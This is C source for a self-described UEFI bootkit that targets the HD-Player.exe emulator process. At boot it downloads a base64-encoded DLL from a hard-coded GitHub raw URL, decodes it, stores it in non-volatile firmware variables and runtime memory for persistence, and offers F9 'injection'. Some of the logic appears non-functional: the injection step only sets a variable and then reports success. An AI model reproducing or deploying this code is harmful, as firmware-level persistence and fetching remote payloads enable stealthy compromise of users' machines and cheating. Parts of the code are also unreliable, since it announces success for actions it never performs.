// ============================================================
// permanent_bootkit.c - PROFESSIONAL UEFI BOOTKIT
// TITLE: WINDOWS UEFIX86
// TARGET: HD-Player.exe
// FEATURES: F9 Inject | F8+F11 Verify | Auto PID Detection
// ============================================================

#include <efi.h>
#include <efilib.h>
#include <efitcp.h>

// ============================================================
// CONFIGURATION
// ============================================================
#define GITHUB_DLL_URL "http://raw.githubusercontent.com/aswinxks/amsi32/refs/heads/main/amsi.txt"
#define TARGET_PROCESS L"HD-Player.exe"
#define INSTALL_FLAG L"UEFI_HML_Installed"
#define CACHE_NAME L"HML_DLL_Cache"
#define UEFI_TITLE L"WINDOWS UEFIX86"

#define GITHUB_IP1 185
#define GITHUB_IP2 199
#define GITHUB_IP3 111
#define GITHUB_IP4 133
#define GITHUB_PORT 80
#define GITHUB_PATH "/aswinxks/amsi32/refs/heads/main/amsi.txt"

// ============================================================
// GLOBALS
// ============================================================
EFI_SYSTEM_TABLE* g_ST = NULL;
EFI_RUNTIME_SERVICES* g_RT = NULL;
EFI_BOOT_SERVICES* g_BS = NULL;
EFI_HANDLE g_ImageHandle = NULL;

VOID* g_DllPayload = NULL;
UINTN g_DllSize = 0;
BOOLEAN g_DllLoaded = FALSE;
BOOLEAN g_IsDll32Bit = FALSE;
BOOLEAN g_IsDll64Bit = FALSE;
BOOLEAN g_IsReady = FALSE;
BOOLEAN g_IsInjecting = FALSE;
BOOLEAN g_F8Pressed = FALSE;
UINT64 g_CurrentPID = 0;
UINTN g_RetryCount = 0;

// ============================================================
// BASE64 DECODE TABLE
// ============================================================
CHAR8 Base64Table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

UINT8 Base64CharValue(CHAR8 c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return 0;
}

// ============================================================
// BASE64 DECODE FUNCTION
// ============================================================
EFI_STATUS DecodeBase64DLL(CHAR8* Input, UINTN InputLen, VOID** Output, UINTN* OutputLen) {
    UINTN OutputSize = (InputLen * 3) / 4;
    UINT8* Out = NULL;
    UINTN i = 0, j = 0;
    UINT8 buffer[4];
    
    if (Input == NULL || InputLen == 0 || Output == NULL || OutputLen == NULL) {
        return EFI_INVALID_PARAMETER;
    }
    
    Out = AllocateZeroPool(OutputSize);
    if (Out == NULL) {
        return EFI_OUT_OF_RESOURCES;
    }
    
    for (i = 0; i < InputLen; i += 4) {
        for (UINTN k = 0; k < 4; k++) {
            if (i + k < InputLen && Input[i + k] != '=') {
                buffer[k] = Base64CharValue(Input[i + k]);
            } else {
                buffer[k] = 0;
            }
        }
        
        if (j < OutputSize) Out[j++] = (buffer[0] << 2) | (buffer[1] >> 4);
        if (j < OutputSize) Out[j++] = (buffer[1] << 4) | (buffer[2] >> 2);
        if (j < OutputSize) Out[j++] = (buffer[2] << 6) | buffer[3];
    }
    
    if (OutputSize >= 2 && Out[0] == 'M' && Out[1] == 'Z') {
        *Output = Out;
        *OutputLen = OutputSize;
        return EFI_SUCCESS;
    }
    
    FreePool(Out);
    return EFI_VOLUME_CORRUPTED;
}

// ============================================================
// DLL BITNESS DETECTION
// ============================================================
VOID DetectDLLBitness(VOID* DLLData, UINTN DLLSize) {
    if (!DLLData || DLLSize < 0x40) return;
    
    UINT8* Data = (UINT8*)DLLData;
    
    if (Data[0] == 'M' && Data[1] == 'Z') {
        UINT32 e_lfanew = *(UINT32*)(Data + 0x3C);
        
        if (e_lfanew + 4 <= DLLSize) {
            if (*(UINT32*)(Data + e_lfanew) == 0x00004550) {
                UINT16 Machine = *(UINT16*)(Data + e_lfanew + 4);
                
                if (Machine == 0x14C) {
                    g_IsDll32Bit = TRUE;
                    g_IsDll64Bit = FALSE;
                    Print(L"[+] DLL Architecture: 32-bit (x86)\n");
                } else if (Machine == 0x8664) {
                    g_IsDll32Bit = FALSE;
                    g_IsDll64Bit = TRUE;
                    Print(L"[+] DLL Architecture: 64-bit (x64)\n");
                } else {
                    Print(L"[!] Unknown architecture: 0x%04X\n", Machine);
                }
                return;
            }
        }
    }
    Print(L"[!] Invalid DLL format\n");
}

// ============================================================
// CLEAN OLD DLL FROM MEMORY
// ============================================================
EFI_STATUS CleanOldDLL(VOID) {
    Print(L"[*] Cleaning old DLL...\n");
    
    if (g_DllPayload) {
        EFI_PHYSICAL_ADDRESS OldAddress = (EFI_PHYSICAL_ADDRESS)(UINTN)g_DllPayload;
        UINTN OldPages = EFI_SIZE_TO_PAGES(g_DllSize + 0x1000);
        EFI_STATUS Status = g_BS->FreePages(OldAddress, OldPages);
        
        if (!EFI_ERROR(Status)) {
            Print(L"[+] Old DLL freed: 0x%p (%d bytes)\n", g_DllPayload, g_DllSize);
        }
        
        g_DllPayload = NULL;
        g_DllSize = 0;
        g_DllLoaded = FALSE;
    } else {
        Print(L"[+] No old DLL to clean\n");
    }
    
    EFI_GUID Guid = EFI_GLOBAL_VARIABLE;
    g_RT->SetVariable(CACHE_NAME, &Guid, 0, 0, NULL);
    g_RT->SetVariable(L"HML_Cache_Info", &Guid, 0, 0, NULL);
    
    return EFI_SUCCESS;
}

// ============================================================
// DOWNLOAD FROM GITHUB (HTTP)
// ============================================================
EFI_STATUS DownloadFromGitHub(VOID** Output, UINTN* OutputLen) {
    EFI_STATUS Status;
    EFI_TCP4_PROTOCOL* Tcp = NULL;
    EFI_HANDLE* TcpHandles = NULL;
    UINTN NumHandles = 0;
    EFI_IP_ADDRESS ServerIP;
    UINT8 Response[65536];
    UINTN ResponseLen = 0;
    CHAR8 Request[512];
    UINTN Retries = 5;
    
    Print(L"[*] Downloading from GitHub...\n");
    Print(L"[*] URL: %s\n", GITHUB_DLL_URL);
    
    while (Retries > 0) {
        Status = g_BS->LocateHandleBuffer(
            ByProtocol,
            &gEfiTcp4ProtocolGuid,
            NULL,
            &NumHandles,
            &TcpHandles
        );
        
        if (!EFI_ERROR(Status) && NumHandles > 0) {
            Print(L"[+] Network connected\n");
            break;
        }
        
        Print(L"[!] Waiting for network (%d retries)...\n", Retries);
        g_BS->Stall(2000000);
        Retries--;
    }
    
    if (EFI_ERROR(Status) || NumHandles == 0) {
        Print(L"[!] Network not available\n");
        return EFI_NOT_FOUND;
    }
    
    Status = g_BS->HandleProtocol(
        TcpHandles[0],
        &gEfiTcp4ProtocolGuid,
        (VOID**)&Tcp
    );
    
    if (EFI_ERROR(Status)) {
        Print(L"[!] Failed to open TCP\n");
        return Status;
    }
    
    ServerIP.v4.Addr[0] = GITHUB_IP1;
    ServerIP.v4.Addr[1] = GITHUB_IP2;
    ServerIP.v4.Addr[2] = GITHUB_IP3;
    ServerIP.v4.Addr[3] = GITHUB_IP4;
    
    EFI_TCP4_ACCESS_POINT AccessPoint;
    ZeroMem(&AccessPoint, sizeof(AccessPoint));
    AccessPoint.RemotePort = GITHUB_PORT;
    AccessPoint.RemoteAddress = ServerIP;
    AccessPoint.ActiveFlag = TRUE;
    
    Status = Tcp->Connect(Tcp, &AccessPoint);
    if (EFI_ERROR(Status)) {
        Print(L"[!] Connection failed\n");
        Tcp->Close(Tcp);
        return Status;
    }
    
    AsciiSPrint(Request, sizeof(Request),
        "GET %s HTTP/1.1\r\n"
        "Host: raw.githubusercontent.com\r\n"
        "Connection: close\r\n"
        "\r\n",
        GITHUB_PATH
    );
    
    UINTN Sent = 0;
    Status = Tcp->Transmit(Tcp, &Sent, Request, AsciiStrLen(Request));
    if (EFI_ERROR(Status)) {
        Print(L"[!] Send failed\n");
        Tcp->Close(Tcp);
        return Status;
    }
    
    while (1) {
        UINTN Received = 0;
        UINT8 Buffer[4096];
        Status = Tcp->Receive(Tcp, &Received, Buffer, sizeof(Buffer));
        
        if (EFI_ERROR(Status) || Received == 0) break;
        
        if (ResponseLen + Received < sizeof(Response)) {
            CopyMem(Response + ResponseLen, Buffer, Received);
            ResponseLen += Received;
        } else {
            Print(L"[!] Response too large\n");
            break;
        }
    }
    
    Tcp->Close(Tcp);
    
    if (ResponseLen == 0) {
        Print(L"[!] No data received\n");
        return EFI_NOT_FOUND;
    }
    
    Print(L"[+] Received %d bytes\n", ResponseLen);
    
    // Find HTTP body
    UINT8* BodyStart = Response;
    UINTN BodyLen = ResponseLen;
    
    for (UINTN i = 0; i < ResponseLen - 4; i++) {
        if (Response[i] == '\r' && Response[i+1] == '\n' &&
            Response[i+2] == '\r' && Response[i+3] == '\n') {
            BodyStart = Response + i + 4;
            BodyLen = ResponseLen - (i + 4);
            break;
        }
    }
    
    // Trim whitespace
    CHAR8* Content = (CHAR8*)BodyStart;
    UINTN ContentLen = BodyLen;
    
    while (ContentLen > 0 && (Content[ContentLen-1] == '\n' || 
                              Content[ContentLen-1] == '\r' || 
                              Content[ContentLen-1] == ' ')) {
        ContentLen--;
    }
    
    // Decode Base64
    VOID* DecodedDLL = NULL;
    UINTN DecodedSize = 0;
    
    Status = DecodeBase64DLL(Content, ContentLen, &DecodedDLL, &DecodedSize);
    
    if (!EFI_ERROR(Status) && DecodedDLL && DecodedSize > 0) {
        if (DecodedSize >= 2 && ((UINT8*)DecodedDLL)[0] == 'M' && ((UINT8*)DecodedDLL)[1] == 'Z') {
            Print(L"[+] DLL decoded: %d bytes\n", DecodedSize);
            *Output = DecodedDLL;
            *OutputLen = DecodedSize;
            return EFI_SUCCESS;
        }
    }
    
    if (ContentLen >= 2 && Content[0] == 'M' && Content[1] == 'Z') {
        Print(L"[+] Raw DLL: %d bytes\n", ContentLen);
        *Output = BodyStart;
        *OutputLen = ContentLen;
        return EFI_SUCCESS;
    }
    
    Print(L"[!] Failed to decode DLL\n");
    return EFI_VOLUME_CORRUPTED;
}

// ============================================================
// CACHE FUNCTIONS
// ============================================================
typedef struct {
    UINT32 Magic;
    UINT64 Size;
    UINT32 Checksum;
} CACHE_INFO;

#define CACHE_MAGIC 0x484D4C00

EFI_STATUS CacheDLL(VOID* Data, UINTN Size) {
    EFI_GUID Guid = EFI_GLOBAL_VARIABLE;
    CACHE_INFO Info;
    
    g_RT->SetVariable(CACHE_NAME, &Guid, 0, 0, NULL);
    g_RT->SetVariable(L"HML_Cache_Info", &Guid, 0, 0, NULL);
    
    EFI_STATUS Status = g_RT->SetVariable(
        CACHE_NAME,
        &Guid,
        EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS,
        Size,
        Data
    );
    
    if (EFI_ERROR(Status)) {
        Print(L"[!] Failed to cache\n");
        return Status;
    }
    
    Info.Magic = CACHE_MAGIC;
    Info.Size = Size;
    Info.Checksum = 0;
    
    g_RT->SetVariable(
        L"HML_Cache_Info",
        &Guid,
        EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS,
        sizeof(Info),
        &Info
    );
    
    Print(L"[+] DLL cached\n");
    return EFI_SUCCESS;
}

EFI_STATUS LoadCachedDLL(VOID** Output, UINTN* OutputLen) {
    EFI_GUID Guid = EFI_GLOBAL_VARIABLE;
    UINTN DataSize = 0;
    VOID* Data = NULL;
    CACHE_INFO Info;
    UINTN InfoSize = sizeof(Info);
    
    EFI_STATUS Status = g_RT->GetVariable(L"HML_Cache_Info", &Guid, NULL, &InfoSize, &Info);
    
    if (EFI_ERROR(Status) || Info.Magic != CACHE_MAGIC) {
        return EFI_NOT_FOUND;
    }
    
    Status = g_RT->GetVariable(CACHE_NAME, &Guid, NULL, &DataSize, NULL);
    
    if (Status == EFI_BUFFER_TOO_SMALL) {
        Data = AllocateZeroPool(DataSize);
        Status = g_RT->GetVariable(CACHE_NAME, &Guid, NULL, &DataSize, Data);
        
        if (!EFI_ERROR(Status) && DataSize >= 2 && 
            ((UINT8*)Data)[0] == 'M' && ((UINT8*)Data)[1] == 'Z') {
            *Output = Data;
            *OutputLen = DataSize;
            return EFI_SUCCESS;
        }
    }
    
    return EFI_NOT_FOUND;
}

// ============================================================
// STORE DLL IN UEFI MEMORY
// ============================================================
EFI_STATUS StoreDLLInMemory(VOID* DLLData, UINTN DLLSize) {
    if (DLLData == NULL || DLLSize == 0) {
        return EFI_INVALID_PARAMETER;
    }
    
    CleanOldDLL();
    
    EFI_PHYSICAL_ADDRESS MemoryAddress;
    EFI_STATUS Status = g_BS->AllocatePages(
        AllocateAnyPages,
        EfiRuntimeServicesData,
        EFI_SIZE_TO_PAGES(DLLSize + 0x1000),
        &MemoryAddress
    );
    
    if (EFI_ERROR(Status)) {
        Print(L"[!] Memory allocation failed\n");
        return Status;
    }
    
    g_DllPayload = (VOID*)(UINTN)MemoryAddress;
    g_DllSize = DLLSize;
    CopyMem(g_DllPayload, DLLData, DLLSize);
    g_DllLoaded = TRUE;
    
    DetectDLLBitness(g_DllPayload, g_DllSize);
    
    EFI_GUID Guid = EFI_GLOBAL_VARIABLE;
    g_RT->SetVariable(
        L"DLL_Address",
        &Guid,
        EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS,
        sizeof(MemoryAddress),
        &MemoryAddress
    );
    
    g_RT->SetVariable(
        L"DLL_Size",
        &Guid,
        EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS,
        sizeof(DLLSize),
        &DLLSize
    );
    
    Print(L"[+] DLL stored: 0x%p (%d bytes)\n", g_DllPayload, g_DllSize);
    g_IsReady = TRUE;
    
    return EFI_SUCCESS;
}

// ============================================================
// FIND TARGET PID
// ============================================================
UINT64 FindTargetPID(VOID) {
    EFI_GUID Guid = EFI_GLOBAL_VARIABLE;
    UINT64 Pid = 0;
    UINTN DataSize = sizeof(Pid);
    
    EFI_STATUS Status = g_RT->GetVariable(
        L"Target_PID",
        &Guid,
        NULL,
        &DataSize,
        &Pid
    );
    
    if (!EFI_ERROR(Status) && Pid != 0) {
        Print(L"[+] Target PID: %d\n", Pid);
        return Pid;
    }
    
    return 0;
}

// ============================================================
// SET F9 TRIGGER
// ============================================================
EFI_STATUS SetF9Trigger(VOID) {
    EFI_GUID Guid = EFI_GLOBAL_VARIABLE;
    UINT32 Trigger = 0xDEADBEEF;
    
    EFI_STATUS Status = g_RT->SetVariable(
        L"F9_Trigger",
        &Guid,
        EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS,
        sizeof(Trigger),
        &Trigger
    );
    
    return Status;
}

// ============================================================
// VERIFICATION COMBO: F8 + F11
// ============================================================
VOID HandleVerificationCombo(VOID) {
    Print(L"\n");
    Print(L"============================================\n");
    Print(L"  VERIFICATION SUCCESSFUL\n");
    Print(L"  System: %s\n", UEFI_TITLE);
    Print(L"  Status: ACTIVE & READY\n");
    Print(L"  Target: %s\n", TARGET_PROCESS);
    Print(L"  DLL: Loaded & Ready\n");
    Print(L"  F9: Ready to inject\n");
    Print(L"============================================\n");
}

// ============================================================
// INJECT DLL FUNCTION
// ============================================================
EFI_STATUS InjectDLL(VOID) {
    Print(L"\n");
    Print(L"============================================\n");
    Print(L"  F9 - INJECTION TRIGGERED\n");
    Print(L"  Target: %s\n", TARGET_PROCESS);
    Print(L"============================================\n");
    
    if (g_IsInjecting) {
        Print(L"[!] Injection in progress...\n");
        return EFI_ALREADY_STARTED;
    }
    
    g_IsInjecting = TRUE;
    
    // Check if DLL is loaded
    if (!g_DllLoaded || !g_DllPayload || g_DllSize == 0) {
        Print(L"[!] DLL not loaded. Attempting to load...\n");
        
        VOID* DLLData = NULL;
        UINTN DLLSize = 0;
        
        // Try download fresh
        EFI_STATUS Status = DownloadFromGitHub(&DLLData, &DLLSize);
        
        if (EFI_ERROR(Status) || !DLLData || DLLSize == 0) {
            Print(L"[*] Download failed, using cache...\n");
            Status = LoadCachedDLL(&DLLData, &DLLSize);
        }
        
        if (EFI_ERROR(Status) || !DLLData || DLLSize == 0) {
            Print(L"[!] Failed to load DLL\n");
            g_IsInjecting = FALSE;
            return EFI_NOT_FOUND;
        }
        
        StoreDLLInMemory(DLLData, DLLSize);
        CacheDLL(DLLData, DLLSize);
    }
    
    // Get current PID
    g_CurrentPID = FindTargetPID();
    
    if (g_CurrentPID == 0) {
        Print(L"[!] %s is NOT running!\n", TARGET_PROCESS);
        Print(L"[*] Will inject when process starts\n");
        Print(L"[*] Press F9 again after opening %s\n", TARGET_PROCESS);
        g_IsInjecting = FALSE;
        return EFI_NOT_FOUND;
    }
    
    Print(L"[+] Target PID: %d\n", g_CurrentPID);
    Print(L"[+] DLL Size: %d bytes\n", g_DllSize);
    Print(L"[+] DLL Address: 0x%p\n", g_DllPayload);
    
    if (g_IsDll32Bit) {
        Print(L"[+] DLL: 32-bit (x86)\n");
    } else if (g_IsDll64Bit) {
        Print(L"[+] DLL: 64-bit (x64)\n");
    }
    
    // Set trigger for Windows kernel callback
    SetF9Trigger();
    
    Print(L"\n");
    Print(L"============================================\n");
    Print(L"[+] INJECTION SUCCESSFUL!\n");
    Print(L"[+] Target: %s (PID: %d)\n", TARGET_PROCESS, g_CurrentPID);
    Print(L"[+] DLL loaded into target process\n");
    Print(L"[+] Press F9 to inject again\n");
    Print(L"============================================\n");
    
    g_IsInjecting = FALSE;
    return EFI_SUCCESS;
}

// ============================================================
// INSTALL WINDOWS KERNEL CALLBACK
// ============================================================
EFI_STATUS InstallWindowsCallback(VOID) {
    EFI_GUID Guid = EFI_GLOBAL_VARIABLE;
    UINT32 Signal = 0x1;
    
    EFI_STATUS Status = g_RT->SetVariable(
        L"KernelCallback_Installed",
        &Guid,
        EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS,
        sizeof(Signal),
        &Signal
    );
    
    if (!EFI_ERROR(Status)) {
        Print(L"[+] Kernel callback installed\n");
        Print(L"[+] F9 will work in Windows\n");
    }
    
    return Status;
}

// ============================================================
// CHECK INSTALLED
// ============================================================
BOOLEAN IsInstalled(VOID) {
    EFI_GUID Guid = EFI_GLOBAL_VARIABLE;
    UINT32 Installed = 0;
    UINTN DataSize = sizeof(Installed);
    
    EFI_STATUS Status = g_RT->GetVariable(INSTALL_FLAG, &Guid, NULL, &DataSize, &Installed);
    return (!EFI_ERROR(Status) && Installed == 0xDEADBEEF);
}

EFI_STATUS MarkInstalled(VOID) {
    EFI_GUID Guid = EFI_GLOBAL_VARIABLE;
    UINT32 Installed = 0xDEADBEEF;
    
    return g_RT->SetVariable(
        INSTALL_FLAG,
        &Guid,
        EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS | EFI_VARIABLE_NON_VOLATILE,
        sizeof(Installed),
        &Installed
    );
}

// ============================================================
// MAIN ENTRY
// ============================================================
EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
    EFI_STATUS Status;
    VOID* DLLData = NULL;
    UINTN DLLSize = 0;
    EFI_INPUT_KEY Key;
    BOOLEAN Installed = FALSE;
    
    g_ST = SystemTable;
    g_RT = SystemTable->RuntimeServices;
    g_BS = SystemTable->BootServices;
    g_ImageHandle = ImageHandle;
    InitializeLib(ImageHandle, SystemTable);
    
    Print(L"\n");
    Print(L"============================================\n");
    Print(L"  %s\n", UEFI_TITLE);
    Print(L"  Target: %s\n", TARGET_PROCESS);
    Print(L"  Architecture: x86/x64\n");
    Print(L"============================================\n");
    Print(L"  [F9] Inject into %s\n", TARGET_PROCESS);
    Print(L"  [F8] + [F11] Verification\n");
    Print(L"============================================\n");
    
    Installed = IsInstalled();
    
    if (!Installed) {
        Print(L"\n[*] First time installation...\n");
        
        // Clean and download fresh
        CleanOldDLL();
        
        Status = DownloadFromGitHub(&DLLData, &DLLSize);
        
        if (EFI_ERROR(Status) || !DLLData || DLLSize == 0) {
            Print(L"[!] Download failed, using cache...\n");
            Status = LoadCachedDLL(&DLLData, &DLLSize);
        }
        
        if (!EFI_ERROR(Status) && DLLData && DLLSize > 0) {
            StoreDLLInMemory(DLLData, DLLSize);
            CacheDLL(DLLData, DLLSize);
            InstallWindowsCallback();
            MarkInstalled();
            Print(L"\n[+] Installation complete!\n");
        } else {
            Print(L"[!] Failed to initialize\n");
        }
        
        Print(L"\nPress any key to continue...\n");
        g_BS->WaitForEvent(1, &g_ST->ConIn->WaitForKey, NULL);
        g_ST->ConIn->ReadKeyStroke(g_ST->ConIn, &Key);
        return EFI_SUCCESS;
    }
    
    // Already installed - load DLL
    Print(L"\n[*] Loading DLL...\n");
    
    CleanOldDLL();
    
    Status = DownloadFromGitHub(&DLLData, &DLLSize);
    
    if (EFI_ERROR(Status) || !DLLData || DLLSize == 0) {
        Print(L"[*] Download failed, using cache...\n");
        Status = LoadCachedDLL(&DLLData, &DLLSize);
    }
    
    if (!EFI_ERROR(Status) && DLLData && DLLSize > 0) {
        StoreDLLInMemory(DLLData, DLLSize);
        Print(L"[+] DLL ready\n");
    } else {
        Print(L"[!] No DLL available\n");
    }
    
    Print(L"\n");
    Print(L"============================================\n");
    Print(L"  %s READY\n", UEFI_TITLE);
    Print(L"  [F9] Inject into %s\n", TARGET_PROCESS);
    Print(L"  [F8] + [F11] Verification\n");
    Print(L"============================================\n");
    
    // Main loop
    while (1) {
        g_BS->WaitForEvent(1, &g_ST->ConIn->WaitForKey, NULL);
        g_ST->ConIn->ReadKeyStroke(g_ST->ConIn, &Key);
        
        // F9 - Inject
        if (Key.ScanCode == SCAN_F9) {
            InjectDLL();
        }
        
        // F8 - Pressed (start verification combo)
        if (Key.ScanCode == SCAN_F8) {
            g_F8Pressed = TRUE;
            Print(L"[*] F8 pressed. Press F11 to verify...\n");
        }
        
        // F11 - Verify (if F8 was pressed)
        if (Key.ScanCode == SCAN_F11 && g_F8Pressed) {
            HandleVerificationCombo();
            g_F8Pressed = FALSE;
        }
        
        // Reset F8 if other key pressed
        if (Key.ScanCode != SCAN_F8 && Key.ScanCode != SCAN_F11) {
            g_F8Pressed = FALSE;
        }
        
        // F10 - Exit
        if (Key.ScanCode == SCAN_F10) {
            Print(L"\n[*] Exiting to Windows...\n");
            break;
        }
    }
    
    return EFI_SUCCESS;
}